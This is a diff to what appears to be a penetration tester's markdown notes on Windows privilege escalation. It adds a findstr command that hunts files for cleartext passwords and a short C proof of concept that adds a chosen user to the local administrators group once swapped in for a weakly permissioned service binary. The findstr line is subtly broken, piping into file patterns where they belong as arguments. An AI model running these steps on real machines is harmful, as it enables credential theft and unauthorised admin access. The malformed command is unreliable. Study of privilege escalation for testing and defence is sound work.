@@ -15,6 +15,14 @@ So if you have a metasploit meterpreter session going you can run **getsystem**.
 
 ## Manually
 
+### Cleartext passwords
+
+Can be find like this:
+
+```
+findstr /si password *.txt | *.xml | *.ini
+```
+
 ### Kernel exploits
 
 Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 
@@ -26,6 +34,21 @@ If we have an exploit written in python but we don't have python installed on th
 ### Misconfigurations
 
 #### Incorrect file and service permissions
+
+If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user with admin privileges.
+
+Here is a POC code for this
+```c
+#include <stdlib.h>
+int main ()
+{
+int i;
+i=system ("net localgroup administrators theusername /add");
+return 0;
+}
+```
+
+
 
 ### Unquoted Service Paths
 
